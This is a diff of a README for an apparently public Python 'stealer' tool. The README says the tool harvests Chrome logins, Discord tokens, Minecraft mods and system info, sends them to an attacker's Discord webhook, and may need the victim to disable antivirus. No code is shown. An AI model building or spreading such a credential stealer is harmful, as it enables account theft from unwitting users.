@@ -1,7 +1,8 @@
-OUT OF DATE DONT USE ---- DOWNLOAD ONLY IF YOU WANT TO FIX/UPDATE IT
 
 
 # stealer
+OUT OF DATE DONT USE ---- DOWNLOAD ONLY IF YOU WANT TO FIX/UPDATE IT
+
 A program made in python. Grabs chrome login information, Minecraft mods (under 8mb), basic computer info and user info, discord tokens and sends to the discord webhook you set
 
 THIS MAY REQUIRE THE PERSON RUNNING main.py TO DISABLE ANTIVIRUS
@@ -57,4 +58,4 @@ Education:
 Legal:
 The author does not hold any responsibility for any harmful or illegal use of this took, you are responsible for your own actions. Attacking targets without prior consent is illegal and is punishable by the law.
 
-programmed by https://github.com/BasedGamer01/
+programmed by https://github.com/3022-2/
